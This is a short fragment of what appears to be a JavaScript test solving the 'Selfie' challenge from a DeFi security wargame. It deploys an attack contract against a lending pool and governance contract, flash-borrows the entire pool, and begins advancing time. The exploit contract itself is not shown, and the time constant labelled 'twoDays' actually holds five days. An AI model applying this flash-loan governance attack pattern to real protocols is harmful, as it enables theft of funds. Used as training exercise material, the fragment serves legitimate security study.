...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackRewarder = await ethers.getContractFactory('AttackSelfie', attacker);
        const hack = await AttackRewarder.deploy(this.pool.address, this.governance.address);

        await hack.loan(TOKENS_IN_POOL);
        const twoDays = 5 * 24 * 60 * 60;
